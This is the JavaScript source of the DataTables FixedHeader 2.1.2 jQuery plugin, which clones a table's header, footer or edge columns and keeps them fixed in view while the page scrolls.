/*! FixedHeader 2.1.2
 * ©2010-2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     FixedHeader
 * @description Fix a table's header or footer, so it is always visible while
 *              Scrolling
 * @version     2.1.2
 * @file        dataTables.fixedHeader.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2009-2014 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

/* Global scope for FixedColumns for backwards compatibility - will be removed
 * in future. Not documented in 1.1.x.
 */

/* Global scope for FixedColumns */
var FixedHeader;

(function(window, document, undefined) {


var factory = function( $, DataTable ) {
"use strict";

/*
 * Function: FixedHeader
 * Purpose:  Provide 'fixed' header, footer and columns for a DataTable
 * Returns:  object:FixedHeader - must be called with 'new'
 * Inputs:   mixed:mTable - target table
 *  @param {object} dt DataTables instance or HTML table node. With DataTables
 *    1.10 this can also be a jQuery collection (with just a single table in its
 *    result set), a jQuery selector, DataTables API instance or settings
 *    object.
 *  @param {object} [oInit] initialisation settings, with the following
 *    properties (each optional)
 *    * bool:top -    fix the header (default true)
 *    * bool:bottom - fix the footer (default false)
 *    * int:left -    fix the left column(s) (default 0)
 *    * int:right -   fix the right column(s) (default 0)
 *    * int:zTop -    fixed header zIndex
 *    * int:zBottom - fixed footer zIndex
 *    * int:zLeft -   fixed left zIndex
 *    * int:zRight -  fixed right zIndex
 */
FixedHeader = function ( mTable, oInit ) {
	/* Sanity check - you just know it will happen */
	if ( ! this instanceof FixedHeader )
	{
		alert( "FixedHeader warning: FixedHeader must be initialised with the 'new' keyword." );
		return;
	}

	var that = this;
	var oSettings = {
		"aoCache": [],
		"oSides": {
			"top": true,
			"bottom": false,
			"left": 0,
			"right": 0
		},
		"oZIndexes": {
			"top": 104,
			"bottom": 103,
			"left": 102,
			"right": 101
		},
		"oCloneOnDraw": {
			"top": false,
			"bottom": false,
			"left": true,
			"right": true
		},
		"oMes": {
			"iTableWidth": 0,
			"iTableHeight": 0,
			"iTableLeft": 0,
			"iTableRight": 0, /* note this is left+width, not actually "right" */
			"iTableTop": 0,
			"iTableBottom": 0 /* note this is top+height, not actually "bottom" */
		},
		"oOffset": {
			"top": 0
		},
		"nTable": null,
		"bFooter": false,
		"bInitComplete": false
	};

	/*
	 * Function: fnGetSettings
	 * Purpose:  Get the settings for this object
	 * Returns:  object: - settings object
	 * Inputs:   -
	 */
	this.fnGetSettings = function () {
		return oSettings;
	};

	/*
	 * Function: fnUpdate
	 * Purpose:  Update the positioning and copies of the fixed elements
	 * Returns:  -
	 * Inputs:   -
	 */
	this.fnUpdate = function () {
		this._fnUpdateClones();
		this._fnUpdatePositions();
	};

	/*
	 * Function: fnPosition
	 * Purpose:  Update the positioning of the fixed elements
	 * Returns:  -
	 * Inputs:   -
	 */
	this.fnPosition = function () {
		this._fnUpdatePositions();
	};


	var dt = $.fn.dataTable.Api ?
		new $.fn.dataTable.Api( mTable ).settings()[0] :
		mTable.fnSettings();

	dt._oPluginFixedHeader = this;

	/* Let's do it */
	this.fnInit( dt, oInit );

};


/*
 * Variable: FixedHeader
 * Purpose:  Prototype for FixedHeader
 * Scope:    global
 */
FixedHeader.prototype = {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Initialisation
	 */

	/*
	 * Function: fnInit
	 * Purpose:  The "constructor"
	 * Returns:  -
	 * Inputs:   {as FixedHeader function}
	 */
	fnInit: function ( oDtSettings, oInit )
	{
		var s = this.fnGetSettings();
		var that = this;

		/* Record the user definable settings */
		this.fnInitSettings( s, oInit );

		if ( oDtSettings.oScroll.sX !== "" || oDtSettings.oScroll.sY !== "" )
		{
			alert( "FixedHeader 2 is not supported with DataTables' scrolling mode at this time" );
			return;
		}

		s.nTable = oDtSettings.nTable;
		oDtSettings.aoDrawCallback.unshift( {
			"fn": function () {
				FixedHeader.fnMeasure();
				that._fnUpdateClones.call(that);
				that._fnUpdatePositions.call(that);
			},
			"sName": "FixedHeader"
		} );

		s.bFooter = ($('>tfoot', s.nTable).length > 0) ? true : false;

		/* Add the 'sides' that are fixed */
		if ( s.oSides.top )
		{
			s.aoCache.push( that._fnCloneTable( "fixedHeader", "FixedHeader_Header", that._fnCloneThead ) );
		}
		if ( s.oSides.bottom )
		{
			s.aoCache.push( that._fnCloneTable( "fixedFooter", "FixedHeader_Footer", that._fnCloneTfoot ) );
		}
		if ( s.oSides.left )
		{
			s.aoCache.push( that._fnCloneTable( "fixedLeft", "FixedHeader_Left", that._fnCloneTLeft, s.oSides.left ) );
		}
		if ( s.oSides.right )
		{
			s.aoCache.push( that._fnCloneTable( "fixedRight", "FixedHeader_Right", that._fnCloneTRight, s.oSides.right ) );
		}

		/* Event listeners for window movement */
		FixedHeader.afnScroll.push( function () {
			that._fnUpdatePositions.call(that);
		} );

		$(window).resize( function () {
			FixedHeader.fnMeasure();
			that._fnUpdateClones.call(that);
			that._fnUpdatePositions.call(that);
		} );

		$(s.nTable)
			.on('column-reorder.dt', function () {
				FixedHeader.fnMeasure();
				that._fnUpdateClones( true );
				that._fnUpdatePositions();
			} )
			.on('column-visibility.dt', function () {
				FixedHeader.fnMeasure();
				that._fnUpdateClones( true );
				that._fnUpdatePositions();
			} );

		/* Get things right to start with */
		FixedHeader.fnMeasure();
		that._fnUpdateClones();
		that._fnUpdatePositions();

		s.bInitComplete = true;
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Support functions
	 */

	/*
	 * Function: fnInitSettings
	 * Purpose:  Take the user's settings and copy them to our local store
	 * Returns:  -
	 * Inputs:   object:s - the local settings object
	 *           object:oInit - the user's settings object
	 */
	fnInitSettings: function ( s, oInit )
	{
		if ( oInit !== undefined )
		{
			if ( oInit.top !== undefined ) {
				s.oSides.top = oInit.top;
			}
			if ( oInit.bottom !== undefined ) {
				s.oSides.bottom = oInit.bottom;
			}
			if ( typeof oInit.left == 'boolean' ) {
				s.oSides.left = oInit.left ? 1 : 0;
			}
			else if ( oInit.left !== undefined ) {
				s.oSides.left = oInit.left;
			}
			if ( typeof oInit.right == 'boolean' ) {
				s.oSides.right = oInit.right ? 1 : 0;
			}
			else if ( oInit.right !== undefined ) {
				s.oSides.right = oInit.right;
			}

			if ( oInit.zTop !== undefined ) {
				s.oZIndexes.top = oInit.zTop;
			}
			if ( oInit.zBottom !== undefined ) {
				s.oZIndexes.bottom = oInit.zBottom;
			}
			if ( oInit.zLeft !== undefined ) {
				s.oZIndexes.left = oInit.zLeft;
			}
			if ( oInit.zRight !== undefined ) {
				s.oZIndexes.right = oInit.zRight;
			}

			if ( oInit.offsetTop !== undefined ) {
				s.oOffset.top = oInit.offsetTop;
			}
			if ( oInit.alwaysCloneTop !== undefined ) {
				s.oCloneOnDraw.top = oInit.alwaysCloneTop;
			}
			if ( oInit.alwaysCloneBottom !== undefined ) {
				s.oCloneOnDraw.bottom = oInit.alwaysCloneBottom;
			}
			if ( oInit.alwaysCloneLeft !== undefined ) {
				s.oCloneOnDraw.left = oInit.alwaysCloneLeft;
			}
			if ( oInit.alwaysCloneRight !== undefined ) {
				s.oCloneOnDraw.right = oInit.alwaysCloneRight;
			}
		}
	},

	/*
	 * Function: _fnCloneTable
	 * Purpose:  Clone the table node and do basic initialisation
	 * Returns:  -
	 * Inputs:   -
	 */
	_fnCloneTable: function ( sType, sClass, fnClone, iCells )
	{
		var s = this.fnGetSettings();
		var nCTable;

		/* We know that the table _MUST_ has a DIV wrapped around it, because this is simply how
		 * DataTables works. Therefore, we can set this to be relatively position (if it is not
		 * alreadu absolute, and use this as the base point for the cloned header
		 */
		if ( $(s.nTable.parentNode).css('position') != "absolute" )
		{
			s.nTable.parentNode.style.position = "relative";
		}

		/* Just a shallow clone will do - we only want the table node */
		nCTable = s.nTable.cloneNode( false );
		nCTable.removeAttribute( 'id' );

		var nDiv = document.createElement( 'div' );
		nDiv.style.position = "absolute";
		nDiv.style.top = "0px";
		nDiv.style.left = "0px";
		nDiv.className += " FixedHeader_Cloned "+sType+" "+sClass;

		/* Set the zIndexes */
		if ( sType == "fixedHeader" )
		{
			nDiv.style.zIndex = s.oZIndexes.top;
		}
		if ( sType == "fixedFooter" )
		{
			nDiv.style.zIndex = s.oZIndexes.bottom;
		}
		if ( sType == "fixedLeft" )
		{
			nDiv.style.zIndex = s.oZIndexes.left;
		}
		else if ( sType == "fixedRight" )
		{
			nDiv.style.zIndex = s.oZIndexes.right;
		}

		/* remove margins since we are going to position it absolutely */
		nCTable.style.margin = "0";

		/* Insert the newly cloned table into the DOM, on top of the "real" header */
		nDiv.appendChild( nCTable );
		document.body.appendChild( nDiv );

		return {
			"nNode": nCTable,
			"nWrapper": nDiv,
			"sType": sType,
			"sPosition": "",
			"sTop": "",
			"sLeft": "",
			"fnClone": fnClone,
			"iCells": iCells
		};
	},

	/*
	 * Function: _fnMeasure
	 * Purpose:  Get the current positioning of the table in the DOM
	 * Returns:  -
	 * Inputs:   -
	 */
	_fnMeasure: function ()
	{
		var
			s = this.fnGetSettings(),
			m = s.oMes,
			jqTable = $(s.nTable),
			oOffset = jqTable.offset(),
			iParentScrollTop = this._fnSumScroll( s.nTable.parentNode, 'scrollTop' ),
			iParentScrollLeft = this._fnSumScroll( s.nTable.parentNode, 'scrollLeft' );

		m.iTableWidth = jqTable.outerWidth();
		m.iTableHeight = jqTable.outerHeight();
		m.iTableLeft = oOffset.left + s.nTable.parentNode.scrollLeft;
		m.iTableTop = oOffset.top + iParentScrollTop;
		m.iTableRight = m.iTableLeft + m.iTableWidth;
		m.iTableRight = FixedHeader.oDoc.iWidth - m.iTableLeft - m.iTableWidth;
		m.iTableBottom = FixedHeader.oDoc.iHeight - m.iTableTop - m.iTableHeight;
	},

	/*
	 * Function: _fnSumScroll
	 * Purpose:  Sum node parameters all the way to the top
	 * Returns:  int: sum
	 * Inputs:   node:n - node to consider
	 *           string:side - scrollTop or scrollLeft
	 */
	_fnSumScroll: function ( n, side )
	{
		var i = n[side];
		while ( n = n.parentNode )
		{
			if ( n.nodeName == 'HTML' || n.nodeName == 'BODY' )
			{
				break;
			}
			i = n[side];
		}
		return i;
	},

	/*
	 * Function: _fnUpdatePositions
	 * Purpose:  Loop over the fixed elements for this table and update their positions
	 * Returns:  -
	 * Inputs:   -
	 */
	_fnUpdatePositions: function ()
	{
		var s = this.fnGetSettings();
		this._fnMeasure();

		for ( var i=0, iLen=s.aoCache.length ; i<iLen ; i++ )
		{
			if ( s.aoCache[i].sType == "fixedHeader" )
			{
				this._fnScrollFixedHeader( s.aoCache[i] );
			}
			else if ( s.aoCache[i].sType == "fixedFooter" )
			{
				this._fnScrollFixedFooter( s.aoCache[i] );
			}
			else if ( s.aoCache[i].sType == "fixedLeft" )
			{
				this._fnScrollHorizontalLeft( s.aoCache[i] );
			}
			else
			{
				this._fnScrollHorizontalRight( s.aoCache[i] );
			}
		}
	},

	/*
	 * Function: _fnUpdateClones
	 * Purpose:  Loop over the fixed elements for this table and call their cloning functions
	 * Returns:  -
	 * Inputs:   -
	 */
	_fnUpdateClones: function ( full )
	{
		var s = this.fnGetSettings();

		if ( full ) {
			// This is a little bit of a hack to force a full clone draw. When
			// `full` is set to true, we want to reclone the source elements,
			// regardless of the clone-on-draw settings
			s.bInitComplete = false;
		}

		for ( var i=0, iLen=s.aoCache.length ; i<iLen ; i++ )
		{
			s.aoCache[i].fnClone.call( this, s.aoCache[i] );
		}

		if ( full ) {
			s.bInitComplete = true;
		}
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Scrolling functions
	 */

	/*
	 * Function: _fnScrollHorizontalLeft
	 * Purpose:  Update the positioning of the scrolling elements
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnScrollHorizontalRight: function ( oCache )
	{
		var
			s = this.fnGetSettings(),
			oMes = s.oMes,
			oWin = FixedHeader.oWin,
			oDoc = FixedHeader.oDoc,
			nTable = oCache.nWrapper,
			iFixedWidth = $(nTable).outerWidth();

		if ( oWin.iScrollRight < oMes.iTableRight )
		{
			/* Fully right aligned */
			this._fnUpdateCache( oCache, 'sPosition', 'absolute', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', oMes.iTableTop+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', (oMes.iTableLeft+oMes.iTableWidth-iFixedWidth)+"px", 'left', nTable.style );
		}
		else if ( oMes.iTableLeft < oDoc.iWidth-oWin.iScrollRight-iFixedWidth )
		{
			/* Middle */
			this._fnUpdateCache( oCache, 'sPosition', 'fixed', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', (oMes.iTableTop-oWin.iScrollTop)+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', (oWin.iWidth-iFixedWidth)+"px", 'left', nTable.style );
		}
		else
		{
			/* Fully left aligned */
			this._fnUpdateCache( oCache, 'sPosition', 'absolute', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', oMes.iTableTop+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', oMes.iTableLeft+"px", 'left', nTable.style );
		}
	},

	/*
	 * Function: _fnScrollHorizontalLeft
	 * Purpose:  Update the positioning of the scrolling elements
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnScrollHorizontalLeft: function ( oCache )
	{
		var
			s = this.fnGetSettings(),
			oMes = s.oMes,
			oWin = FixedHeader.oWin,
			oDoc = FixedHeader.oDoc,
			nTable = oCache.nWrapper,
			iCellWidth = $(nTable).outerWidth();

		if ( oWin.iScrollLeft < oMes.iTableLeft )
		{
			/* Fully left align */
			this._fnUpdateCache( oCache, 'sPosition', 'absolute', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', oMes.iTableTop+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', oMes.iTableLeft+"px", 'left', nTable.style );
		}
		else if ( oWin.iScrollLeft < oMes.iTableLeft+oMes.iTableWidth-iCellWidth )
		{
			this._fnUpdateCache( oCache, 'sPosition', 'fixed', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', (oMes.iTableTop-oWin.iScrollTop)+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', "0px", 'left', nTable.style );
		}
		else
		{
			/* Fully right align */
			this._fnUpdateCache( oCache, 'sPosition', 'absolute', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', oMes.iTableTop+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', (oMes.iTableLeft+oMes.iTableWidth-iCellWidth)+"px", 'left', nTable.style );
		}
	},

	/*
	 * Function: _fnScrollFixedFooter
	 * Purpose:  Update the positioning of the scrolling elements
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnScrollFixedFooter: function ( oCache )
	{
		var
			s = this.fnGetSettings(),
			oMes = s.oMes,
			oWin = FixedHeader.oWin,
			oDoc = FixedHeader.oDoc,
			nTable = oCache.nWrapper,
			iTheadHeight = $("thead", s.nTable).outerHeight(),
			iCellHeight = $(nTable).outerHeight();

		if ( oWin.iScrollBottom < oMes.iTableBottom )
		{
			/* Below */
			this._fnUpdateCache( oCache, 'sPosition', 'absolute', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', (oMes.iTableTop+oMes.iTableHeight-iCellHeight)+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', oMes.iTableLeft+"px", 'left', nTable.style );
		}
		else if ( oWin.iScrollBottom < oMes.iTableBottom+oMes.iTableHeight-iCellHeight-iTheadHeight )
		{
			this._fnUpdateCache( oCache, 'sPosition', 'fixed', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', (oWin.iHeight-iCellHeight)+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', (oMes.iTableLeft-oWin.iScrollLeft)+"px", 'left', nTable.style );
		}
		else
		{
			/* Above */
			this._fnUpdateCache( oCache, 'sPosition', 'absolute', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', (oMes.iTableTop+iCellHeight)+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', oMes.iTableLeft+"px", 'left', nTable.style );
		}
	},

	/*
	 * Function: _fnScrollFixedHeader
	 * Purpose:  Update the positioning of the scrolling elements
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnScrollFixedHeader: function ( oCache )
	{
		var
			s = this.fnGetSettings(),
			oMes = s.oMes,
			oWin = FixedHeader.oWin,
			oDoc = FixedHeader.oDoc,
			nTable = oCache.nWrapper,
			iTbodyHeight = 0,
			anTbodies = s.nTable.getElementsByTagName('tbody');

		for (var i = 0; i < anTbodies.length; ++i) {
			iTbodyHeight += anTbodies[i].offsetHeight;
		}

		if ( oMes.iTableTop > oWin.iScrollTop + s.oOffset.top )
		{
			/* Above the table */
			this._fnUpdateCache( oCache, 'sPosition', "absolute", 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', oMes.iTableTop+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', oMes.iTableLeft+"px", 'left', nTable.style );
		}
		else if ( oWin.iScrollTop + s.oOffset.top > oMes.iTableTop+iTbodyHeight )
		{
			/* At the bottom of the table */
			this._fnUpdateCache( oCache, 'sPosition', "absolute", 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', (oMes.iTableTop+iTbodyHeight)+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', oMes.iTableLeft+"px", 'left', nTable.style );
		}
		else
		{
			/* In the middle of the table */
			this._fnUpdateCache( oCache, 'sPosition', 'fixed', 'position', nTable.style );
			this._fnUpdateCache( oCache, 'sTop', s.oOffset.top+"px", 'top', nTable.style );
			this._fnUpdateCache( oCache, 'sLeft', (oMes.iTableLeft-oWin.iScrollLeft)+"px", 'left', nTable.style );
		}
	},

	/*
	 * Function: _fnUpdateCache
	 * Purpose:  Check the cache and update cache and value if needed
	 * Returns:  -
	 * Inputs:   object:oCache - local cache object
	 *           string:sCache - cache property
	 *           string:sSet - value to set
	 *           string:sProperty - object property to set
	 *           object:oObj - object to update
	 */
	_fnUpdateCache: function ( oCache, sCache, sSet, sProperty, oObj )
	{
		if ( oCache[sCache] != sSet )
		{
			oObj[sProperty] = sSet;
			oCache[sCache] = sSet;
		}
	},



	/**
	 * Copy the classes of all child nodes from one element to another. This implies
	 * that the two have identical structure - no error checking is performed to that
	 * fact.
	 *  @param {element} source Node to copy classes from
	 *  @param {element} dest Node to copy classes too
	 */
	_fnClassUpdate: function ( source, dest )
	{
		var that = this;

		if ( source.nodeName.toUpperCase() === "TR" || source.nodeName.toUpperCase() === "TH" ||
			 source.nodeName.toUpperCase() === "TD" || source.nodeName.toUpperCase() === "SPAN" )
		{
			dest.className = source.className;
		}

		$(source).children().each( function (i) {
			that._fnClassUpdate( $(source).children()[i], $(dest).children()[i] );
		} );
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Cloning functions
	 */

	/*
	 * Function: _fnCloneThead
	 * Purpose:  Clone the thead element
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnCloneThead: function ( oCache )
	{
		var s = this.fnGetSettings();
		var nTable = oCache.nNode;

		if ( s.bInitComplete && !s.oCloneOnDraw.top )
		{
			this._fnClassUpdate( $('thead', s.nTable)[0], $('thead', nTable)[0] );
			return;
		}

		/* Set the wrapper width to match that of the cloned table */
		var iDtWidth = $(s.nTable).outerWidth();
		oCache.nWrapper.style.width = iDtWidth+"px";
		nTable.style.width = iDtWidth+"px";

		/* Remove any children the cloned table has */
		while ( nTable.childNodes.length > 0 )
		{
			$('thead th', nTable).unbind( 'click' );
			nTable.removeChild( nTable.childNodes[0] );
		}

		/* Clone the DataTables header */
		var nThead = $('thead', s.nTable).clone(true)[0];
		nTable.appendChild( nThead );

		/* Copy the widths across - apparently a clone isn't good enough for this */
		var a = [];
		var b = [];

		$("thead>tr th", s.nTable).each( function (i) {
			a.push( $(this).width() );
		} );

		$("thead>tr td", s.nTable).each( function (i) {
			b.push( $(this).width() );
		} );

		$("thead>tr th", s.nTable).each( function (i) {
			$("thead>tr th:eq("+i+")", nTable).width( a[i] );
			$(this).width( a[i] );
		} );

		$("thead>tr td", s.nTable).each( function (i) {
			$("thead>tr td:eq("+i+")", nTable).width( b[i] );
			$(this).width( b[i] );
		} );

		// Stop DataTables 1.9 from putting a focus ring on the headers when
		// clicked to sort
		$('th.sorting, th.sorting_desc, th.sorting_asc', nTable).bind( 'click', function () {
			this.blur();
		} );
	},

	/*
	 * Function: _fnCloneTfoot
	 * Purpose:  Clone the tfoot element
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnCloneTfoot: function ( oCache )
	{
		var s = this.fnGetSettings();
		var nTable = oCache.nNode;

		/* Set the wrapper width to match that of the cloned table */
		oCache.nWrapper.style.width = $(s.nTable).outerWidth()+"px";

		/* Remove any children the cloned table has */
		while ( nTable.childNodes.length > 0 )
		{
			nTable.removeChild( nTable.childNodes[0] );
		}

		/* Clone the DataTables footer */
		var nTfoot = $('tfoot', s.nTable).clone(true)[0];
		nTable.appendChild( nTfoot );

		/* Copy the widths across - apparently a clone isn't good enough for this */
		$("tfoot:eq(0)>tr th", s.nTable).each( function (i) {
			$("tfoot:eq(0)>tr th:eq("+i+")", nTable).width( $(this).width() );
		} );

		$("tfoot:eq(0)>tr td", s.nTable).each( function (i) {
			$("tfoot:eq(0)>tr td:eq("+i+")", nTable).width( $(this).width() );
		} );
	},

	/*
	 * Function: _fnCloneTLeft
	 * Purpose:  Clone the left column(s)
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnCloneTLeft: function ( oCache )
	{
		var s = this.fnGetSettings();
		var nTable = oCache.nNode;
		var nBody = $('tbody', s.nTable)[0];

		/* Remove any children the cloned table has */
		while ( nTable.childNodes.length > 0 )
		{
			nTable.removeChild( nTable.childNodes[0] );
		}

		/* Is this the most efficient way to do this - it looks horrible... */
		nTable.appendChild( $("thead", s.nTable).clone(true)[0] );
		nTable.appendChild( $("tbody", s.nTable).clone(true)[0] );
		if ( s.bFooter )
		{
			nTable.appendChild( $("tfoot", s.nTable).clone(true)[0] );
		}

		/* Remove unneeded cells */
		var sSelector = 'gt(' + (oCache.iCells - 1) + ')';
		$('thead tr', nTable).each( function (k) {
			$('th:' + sSelector, this).remove();
		} );

		$('tfoot tr', nTable).each( function (k) {
			$('th:' + sSelector, this).remove();
		} );

		$('tbody tr', nTable).each( function (k) {
			$('td:' + sSelector, this).remove();
		} );

		this.fnEqualiseHeights( 'thead', nBody.parentNode, nTable );
		this.fnEqualiseHeights( 'tbody', nBody.parentNode, nTable );
		this.fnEqualiseHeights( 'tfoot', nBody.parentNode, nTable );

		var iWidth = 0;
		for (var i = 0; i < oCache.iCells; i++) {
			iWidth += $('thead tr th:eq(' + i + ')', s.nTable).outerWidth();
		}
		nTable.style.width = iWidth+"px";
		oCache.nWrapper.style.width = iWidth+"px";
	},

	/*
	 * Function: _fnCloneTRight
	 * Purpose:  Clone the right most column(s)
	 * Returns:  -
	 * Inputs:   object:oCache - the cached values for this fixed element
	 */
	_fnCloneTRight: function ( oCache )
	{
		var s = this.fnGetSettings();
		var nBody = $('tbody', s.nTable)[0];
		var nTable = oCache.nNode;
		var iCols = $('tbody tr:eq(0) td', s.nTable).length;

		/* Remove any children the cloned table has */
		while ( nTable.childNodes.length > 0 )
		{
			nTable.removeChild( nTable.childNodes[0] );
		}

		/* Is this the most efficient way to do this - it looks horrible... */
		nTable.appendChild( $("thead", s.nTable).clone(true)[0] );
		nTable.appendChild( $("tbody", s.nTable).clone(true)[0] );
		if ( s.bFooter )
		{
			nTable.appendChild( $("tfoot", s.nTable).clone(true)[0] );
		}
		$('thead tr th:lt('+(iCols-oCache.iCells)+')', nTable).remove();
		$('tfoot tr th:lt('+(iCols-oCache.iCells)+')', nTable).remove();

		/* Remove unneeded cells */
		$('tbody tr', nTable).each( function (k) {
			$('td:lt('+(iCols-oCache.iCells)+')', this).remove();
		} );

		this.fnEqualiseHeights( 'thead', nBody.parentNode, nTable );
		this.fnEqualiseHeights( 'tbody', nBody.parentNode, nTable );
		this.fnEqualiseHeights( 'tfoot', nBody.parentNode, nTable );

		var iWidth = 0;
		for (var i = 0; i < oCache.iCells; i++) {
			iWidth += $('thead tr th:eq('+(iCols-1-i)+')', s.nTable).outerWidth();
		}
		nTable.style.width = iWidth+"px";
		oCache.nWrapper.style.width = iWidth+"px";
	},


	/**
	 * Equalise the heights of the rows in a given table node in a cross browser way. Note that this
	 * is more or less lifted as is from FixedColumns
	 *  @method  fnEqualiseHeights
	 *  @returns void
	 *  @param   {string} parent Node type - thead, tbody or tfoot
	 *  @param   {element} original Original node to take the heights from
	 *  @param   {element} clone Copy the heights to
	 *  @private
	 */
	"fnEqualiseHeights": function ( parent, original, clone )
	{
		var that = this;
		var originals = $(parent +' tr', original);
		var height;

		$(parent+' tr', clone).each( function (k) {
			height = originals.eq( k ).css('height');

			// This is nasty :-(. IE has a sub-pixel error even when setting
			// the height below (the Firefox fix) which causes the fixed column
			// to go out of alignment. Need to add a pixel before the assignment
			// Can this be feature detected? Not sure how...
			if ( navigator.appName == 'Microsoft Internet Explorer' ) {
				height = parseInt( height, 10 ) + 1;
			}

			$(this).css( 'height', height );

			// For Firefox to work, we need to also set the height of the
			// original row, to the value that we read from it! Otherwise there
			// is a sub-pixel rounding error
			originals.eq( k ).css( 'height', height );
		} );
	}
};


/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Static properties and methods
 *   We use these for speed! This information is common to all instances of FixedHeader, so no
 * point if having them calculated and stored for each different instance.
 */

/*
 * Variable: oWin
 * Purpose:  Store information about the window positioning
 * Scope:    FixedHeader
 */
FixedHeader.oWin = {
	"iScrollTop": 0,
	"iScrollRight": 0,
	"iScrollBottom": 0,
	"iScrollLeft": 0,
	"iHeight": 0,
	"iWidth": 0
};

/*
 * Variable: oDoc
 * Purpose:  Store information about the document size
 * Scope:    FixedHeader
 */
FixedHeader.oDoc = {
	"iHeight": 0,
	"iWidth": 0
};

/*
 * Variable: afnScroll
 * Purpose:  Array of functions that are to be used for the scrolling components
 * Scope:    FixedHeader
 */
FixedHeader.afnScroll = [];

/*
 * Function: fnMeasure
 * Purpose:  Update the measurements for the window and document
 * Returns:  -
 * Inputs:   -
 */
FixedHeader.fnMeasure = function ()
{
	var
		jqWin = $(window),
		jqDoc = $(document),
		oWin = FixedHeader.oWin,
		oDoc = FixedHeader.oDoc;

	oDoc.iHeight = jqDoc.height();
	oDoc.iWidth = jqDoc.width();

	oWin.iHeight = jqWin.height();
	oWin.iWidth = jqWin.width();
	oWin.iScrollTop = jqWin.scrollTop();
	oWin.iScrollLeft = jqWin.scrollLeft();
	oWin.iScrollRight = oDoc.iWidth - oWin.iScrollLeft - oWin.iWidth;
	oWin.iScrollBottom = oDoc.iHeight - oWin.iScrollTop - oWin.iHeight;
};


FixedHeader.version = "2.1.2";


/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Global processing
 */

/*
 * Just one 'scroll' event handler in FixedHeader, which calls the required components. This is
 * done as an optimisation, to reduce calculation and proagation time
 */
$(window).scroll( function () {
	FixedHeader.fnMeasure();

	for ( var i=0, iLen=FixedHeader.afnScroll.length ; i<iLen ; i++ ) {
		FixedHeader.afnScroll[i]();
	}
} );


$.fn.dataTable.FixedHeader = FixedHeader;
$.fn.DataTable.FixedHeader = FixedHeader;


return FixedHeader;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.FixedHeader ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


